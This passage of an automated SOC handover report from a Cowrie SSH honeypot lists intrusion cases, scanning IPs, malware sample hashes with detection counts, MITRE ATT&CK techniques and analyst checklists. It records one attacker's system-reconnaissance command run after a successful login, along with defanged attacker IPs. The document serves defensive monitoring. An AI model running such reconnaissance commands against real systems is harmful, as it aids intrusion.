| `2026-05-31 14:50:28` | `cowrie.log.closed` |
| `2026-05-31 14:50:28` | `cowrie.session.params` |
| `2026-05-31 14:50:28` | `cowrie.command.input` |
| `2026-05-31 14:50:28` | `cowrie.log.closed` |
| `2026-05-31 14:50:28` | `cowrie.session.params` |
| `2026-05-31 14:50:28` | `cowrie.command.input` |
| `2026-05-31 14:50:29` | `cowrie.log.closed` |
| `2026-05-31 14:50:29` | `cowrie.session.params` |
| `2026-05-31 14:50:29` | `cowrie.command.input` |
| `2026-05-31 14:50:29` | `cowrie.log.closed` |
| `2026-05-31 14:50:29` | `cowrie.session.params` |
| `2026-05-31 14:50:29` | `cowrie.command.input` |
| `2026-05-31 14:50:30` | `cowrie.log.closed` |
| `2026-05-31 14:50:30` | `cowrie.session.params` |
| `2026-05-31 14:50:30` | `cowrie.command.input` |
| `2026-05-31 14:50:30` | `cowrie.log.closed` |
| `2026-05-31 14:50:30` | `cowrie.session.params` |
| `2026-05-31 14:50:30` | `cowrie.command.input` |
| `2026-05-31 14:50:30` | `cowrie.log.closed` |
| `2026-05-31 14:50:31` | `cowrie.session.params` |
| `2026-05-31 14:50:31` | `cowrie.command.input` |
| `2026-05-31 14:50:31` | `cowrie.log.closed` |
| `2026-05-31 14:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.195.64[.]232` to AbuseIPDB if not already reported
- [ ] Block `203.195.64[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-652d3388ea07

| Field | Detail |
|---|---|
| **Source IP** | `45.125.66[.]98` |
| **First Seen** | 2026-05-31 15:16 |
| **Last Seen** | 2026-05-31 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat /proc/self/status` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 15:16:01` | `cowrie.session.connect` |
| `2026-05-31 15:16:01` | `cowrie.client.version` |
| `2026-05-31 15:16:02` | `cowrie.client.kex` |
| `2026-05-31 15:16:02` | `cowrie.login.success` |
| `2026-05-31 15:16:03` | `cowrie.session.params` |
| `2026-05-31 15:16:03` | `cowrie.command.input` |
| `2026-05-31 15:16:03` | `cowrie.log.closed` |
| `2026-05-31 15:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.125.66[.]98` to AbuseIPDB if not already reported
- [ ] Block `45.125.66[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `187.108.193[.]54` | **83** | 2026-05-31 13:51 | 2026-05-31 15:18 | 51m | 0 | `T1592` | 🟠 MEDIUM |
| `112.137.143[.]2` | **15** | 2026-05-31 14:00 | 2026-05-31 14:29 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `159.203.20[.]239` | **15** | 2026-05-31 13:53 | 2026-05-31 15:17 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `167.172.203[.]111` | **15** | 2026-05-31 14:05 | 2026-05-31 14:25 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `109.91.4[.]177` | **10** | 2026-05-31 14:02 | 2026-05-31 14:24 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `61.151.249[.]194` | **4** | 2026-05-31 14:09 | 2026-05-31 14:17 | 7m | 0 | `T1592` | 🟢 LOW |
| `20.65.137[.]218` | **2** | 2026-05-31 15:04 | 2026-05-31 15:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `203.195.64[.]232` | **2** | 2026-05-31 14:50 | 2026-05-31 14:52 | 4m | 0 | `T1592` | 🟢 LOW |
| `106.13.107[.]35` | 1 | 2026-05-31 14:47 | 2026-05-31 14:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.219.125[.]143` | 1 | 2026-05-31 14:12 | 2026-05-31 14:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | 1 | 2026-05-31 13:51 | 2026-05-31 13:51 | 40s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-05-31 13:52 | 2026-05-31 13:52 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.127[.]204` | 1 | 2026-05-31 14:02 | 2026-05-31 14:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-05-31 15:05 | 2026-05-31 15:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.106.80[.]22` | 1 | 2026-05-31 13:57 | 2026-05-31 13:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.139[.]111` | 1 | 2026-05-31 14:06 | 2026-05-31 14:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.51[.]110` | 1 | 2026-05-31 14:02 | 2026-05-31 14:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `40.82.214[.]8` | 1 | 2026-05-31 14:37 | 2026-05-31 14:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `180.106.80[.]22` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 4 |
| `106.219.125[.]143` | IN | Bharti Airtel Limited | **100** ⚠️ | 0 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `187.108.193[.]54` | BR | EVEO S.A. | **100** ⚠️ | 10 |
| `20.65.137[.]218` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `165.154.225[.]20` | HK | Scloud Pte Ltd t/a Scloud Pte Ltd | **100** ⚠️ | 50 |
| `109.91.4[.]177` | DE | Vodafone West GmbH | **100** ⚠️ | 50 |
| `45.125.66[.]98` | LT | HostBaltic Lithuania | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 78 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 42 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 29 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 191 cases |
| Tool 34  | Credential Extractor        | ✅ 72 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (3.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 29 priority case(s) shown individually · 18 recon entry/entries in table (8 group(s) consolidating 146 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-31T15:20:06Z_
